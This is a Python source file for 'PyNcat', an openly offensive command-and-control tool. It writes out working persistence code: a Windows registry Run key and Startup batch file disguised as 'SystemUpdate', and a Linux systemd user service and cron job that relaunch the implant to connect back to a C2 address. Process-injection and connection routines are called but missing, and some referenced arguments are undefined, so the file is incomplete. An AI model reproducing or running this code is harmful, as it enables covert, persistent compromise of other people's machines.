#!/usr/bin/env python3
"""
PyNcat - Professional C2 with SSL, Persistence & Process Injection
"""

import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import time
import random
import ssl
import os
import platform
from typing import Optional, Tuple

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)


class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        self.ssl_context: Optional[ssl.SSLContext] = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(description="PyNcat - Professional C2", formatter_class=argparse.ArgumentDefaultsHelpFormatter)

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode')
        group.add_argument('-c', '--connect', type=str, help='Target IP')

        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        parser.add_argument('--ssl', action='store_true', help='Enable SSL')
        parser.add_argument('--persistent', action='store_true', help='Enable persistence')
        parser.add_argument('--persist-method', choices=['auto', 'registry', 'cron', 'systemd'], default='auto',
                            help='Persistence method')
        
        # ... (keep your existing arguments: --inject-pid, --file, etc.)

        parser.add_argument('-v', '--verbose', action='store_true')
        return parser.parse_args()

         # ====================== PERSISTENCE ======================
    def install_persistence(self):
        """Install persistence with automatic C2 configuration"""
        if not self.args.persistent:
            return

        c2_ip = self.args.connect
        if not c2_ip:
            c2_ip = self._get_public_ip() or "YOUR_C2_IP_HERE"

        logger.info(f"[*] Installing persistence pointing to C2: {c2_ip}")

        system = platform.system().lower()
        
        if system == "windows":
            self._windows_persistence(c2_ip)
        elif system == "linux":
            self._linux_persistence(c2_ip)
        else:
            logger.warning(f"[!] Persistence not fully supported on {system}")

    def _get_public_ip(self) -> Optional[str]:
        """Try to get public IP automatically"""
        try:
            import urllib.request
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
                return response.read().decode('utf-8').strip()
        except:
            try:
                import socket
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
            except:
                return None

    def _windows_persistence(self, c2_ip: str):
        """Windows - Multiple methods"""
        methods = []
        exe_path = os.path.abspath(sys.argv[0])
        cmd = f'"{exe_path}" -c {c2_ip} -p 4444 --ssl --persistent'

        try:
            # Method 1: HKCU Run Key (most common)
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
            methods.append("Registry (HKCU\\Run)")
        except:
            pass

        try:
            # Method 2: Startup Folder
            startup = os.path.join(os.getenv('APPDATA'), 
                                 r"Microsoft\Windows\Start Menu\Programs\Startup")
            shortcut = os.path.join(startup, "SystemUpdate.lnk")
            # Simple .bat fallback
            bat_path = os.path.join(startup, "update.bat")
            with open(bat_path, "w") as f:
                f.write(f'@echo off\n{cmd}')
            methods.append("Startup Folder")
        except:
            pass

        if methods:
            logger.info(f"[+] Windows persistence installed via: {', '.join(methods)}")
        else:
            logger.error("[!] All Windows persistence methods failed")

    def _linux_persistence(self, c2_ip: str):
        """Linux persistence methods"""
        exe_path = os.path.abspath(sys.argv[0])
        cmd = f"{exe_path} -c {c2_ip} -p 4444 --ssl --persistent"

        methods = []

        # Method 1: systemd user service
        try:
            service_path = f"{os.path.expanduser('~')}/.config/systemd/user/pyncat.service"
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            
            service = f"""[Unit]
Description=System Maintenance Service

[Service]
ExecStart={cmd}
Restart=always
RestartSec=8

[Install]
WantedBy=default.target
"""
            with open(service_path, "w") as f:
                f.write(service)

            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True, check=False)
            subprocess.run(["systemctl", "--user", "enable", "--now", "pyncat.service"], capture_output=True, check=False)
            methods.append("systemd user service")
        except:
            pass

        # Method 2: Cron
        try:
            cron_cmd = f"*/3 * * * * {cmd} >/dev/null 2>&1"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True, check=False)
            methods.append("cron job")
        except:
            pass

        if methods:
            logger.info(f"[+] Linux persistence installed: {', '.join(methods)}")
        else:
            logger.error("[!] Failed to install Linux persistence")

    # ====================== RUN ======================
    def run(self):
        # Process Injection (highest priority)
        if self.args.inject_pid:
            if self.args.inject_shellcode:
                self.inject_shellcode(self.args.inject_pid, self.args.inject_shellcode)
            elif self.args.inject_dll:
                self.inject_dll(self.args.inject_pid, self.args.inject_dll)
            return

        # Install persistence BEFORE connecting
        if self.args.persistent:
            self.install_persistence()

        # Normal C2 Operation
        if self.args.listen:
            self.listen()
        else:
            if self.args.persistent:
                self.connect_persistent()
            else:
                self.connect_once()

if __name__ == "__main__":
    try:
        pyncat = PyNcat()
        pyncat.run()
    except KeyboardInterrupt:
        print("\n[!] PyNcat terminated.")
    except Exception as e:
        logger.error(f"Critical error: {e}")
